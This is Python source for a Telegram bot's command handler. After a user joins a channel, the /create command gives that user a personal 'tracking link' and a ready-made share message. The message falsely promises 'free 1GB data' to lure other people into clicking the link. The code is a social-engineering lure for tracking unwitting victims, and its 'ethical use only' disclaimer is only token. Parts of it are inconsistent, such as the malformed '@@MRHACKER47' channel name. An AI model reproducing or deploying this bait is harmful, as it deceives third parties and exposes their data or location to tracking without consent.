command = message.text

if command == "/create":
    user_id = message.from_user.id
    channel_username = "@@MRHACKER47"

    try:
        # Check if the user is in the channel
        chat_member = bot.get_chat_member(chat_id=channel_username, user_id=user_id)
        if chat_member and chat_member.status not in ["left", "kicked"]:
            # Generate the unique URL
            url = f"https://sgtracker.vercel.app/?id={user_id}"

            # Create the user-specific message that will be shown
            user_message_text = (
                f"🎉 𝗬𝗼𝘂𝗿 𝗨𝗻𝗶𝗾𝘂𝗲 𝗧𝗿𝗮𝗰𝗸𝗶𝗻𝗴 𝗟𝗶𝗻𝗸 𝗶𝘀 𝗥𝗲𝗮𝗱𝘆! 🎉\n\n"
                f"🔗 𝗬𝗼𝘂𝗿 𝗟𝗶𝗻𝗸: {url}\n\n"  # Directly show the URL
                "❌𝗪𝗮𝗿𝗻𝗶𝗻𝗴\nThis bot is for 𝗹𝗲𝗴𝗮𝗹 and 𝗲𝘁𝗵𝗶𝗰𝗮𝗹 purposes only. Do 𝗡𝗢𝗧 use it for illegal or malicious activities! 🚫 \n\n"
                "Feel The power 💪⚡ of SG Modder 😎\n\n"
                "💬 𝗡𝗲𝗲𝗱 𝗛𝗲𝗹𝗽?\n🤔If you face any issues or have questions, our support team is here to assist you! 😃\n\n"
            )

            # Create a separate shareable message with a call to action for others
            share_message_text = (
                f"🌟𝗘𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝗢𝗳𝗳𝗲𝗿: 𝗖𝗹𝗮𝗶𝗺 𝗬𝗼𝘂𝗿 𝗙𝗿𝗲𝗲 𝟭𝗚𝗕 𝗗𝗮𝘁𝗮!🌟\n\n"
                f"Looking for a quick internet boost? 🎁\nEnjoy 1GB of free internet 🌍✨! \n\n"
                f"✨ 𝗖𝗹𝗮𝗶𝗺 𝘆𝗼𝘂𝗿 𝗙𝗥𝗘𝗘 𝟭𝗚𝗕 𝗻𝗼𝘄! 🚀\n\n"
                f"👉𝗚𝗲𝘁 𝗠𝘆 𝗙𝗿𝗲𝗲 𝟭𝗚𝗕\n"
                f"👉 https://sgtracker.vercel.app/?id={user_id}\n\n"
                f"**Don't wait, 𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝘁𝗶𝗺𝗲 𝗼𝗳𝗳𝗲𝗿!**\n\n\n"
                f"🔑 Share this link with friends! 🎉\n"
                f"🔔 𝗦𝘁𝗮𝘆 𝘂𝗽𝗱𝗮𝘁𝗲𝗱: @SG_Modder1."
            )

            # Inline keyboard with the Share button (sharing the custom share message)
            keyboard = [
                [{"text": "Share this with friends", "url": f"https://t.me/share/url?url={share_message_text}"}],
                [{"text": "My another Channel", "url": "https://t.me/SG_Modder0"}],  # Button to join @SG_Modder1
                [{"text": "Contact Owner If any issue", "url": "https://t.me/SG_Modder"}]  # Button to contact the owner
            ]
            
            # Send the user's message with the share button and additional buttons
            bot.sendMessage(
                chat_id=message.chat.id,
                text=user_message_text,
                reply_markup={"inline_keyboard": keyboard},
                parse_mode="Markdown"
            )
        else:
            # User is not a member of the channel, prompt to join
            join_message = (
                "❌ You need to join our official channel @SG_Modder1 to use this feature.\n\n"
                "🔹 **Why join the channel?**\n"
                "By joining the channel, you'll stay updated with important announcements, "
                "exclusive features, and updates related to the bot.\n\n"
                "📢 **How to join:**\n"
                "1. Tap the **Join @SG_Modder1** button below.\n\n"
                "2. After joining, return here and use the /create command again."
            )
            
            # Add a "Join" button
            keyboard = [
                [{"text": "Join @SG_Modder1", "url": f"https://t.me/{channel_username[1:]}"}]
            ]
            
            bot.sendMessage(
                chat_id=message.chat.id,
                text=join_message,
                reply_markup={"inline_keyboard": keyboard}
            )
    except Exception as e:
        # Handle exceptions
        bot.reply_text(
            message.chat.id,
            (
                "⚠️ An unexpected error occurred while processing your request. "
                "Please try again later.\n\n"
                f"Error details: {str(e)}"
            )
        )

elif command == "/check":
    user_id = message.from_user.id
    channel_username = "@SG_Modder1"

    try:
        # Check if the user is in the channel
        chat_member = bot.get_chat_member(chat_id=channel_username, user_id=user_id)
        if chat_member and chat_member.status not in ["left", "kicked"]:
            bot.reply_text(message.chat.id, "✅ You are a member of the channel! Enjoy the features!")
        else:
            bot.reply_text(
                message.chat.id,
                (
                    "❌ You are not a member of the channel.\n\n"
                    "Please join @SG_Modder1 to access exclusive features and stay updated with the latest news."
                )
            )
    except Exception as e:
        bot.reply_text(
            message.chat.id,
            (
                "⚠️ An error occurred while checking your membership status. "
                "Please try again later.\n\n"
                f"Error details: {str(e)}"
            )
        )

else:
    # Handle unrecognized commands
    bot.reply_text(
        message.chat.id,
        (
            "❔ Unrecognized command.\n\n"
            "Use the following commands to interact with the bot:\n"
            "🔹 **/create** - Generate your unique URL.\n"
            "🔹 **/check** - Check your membership status in the channel."
        )
    )
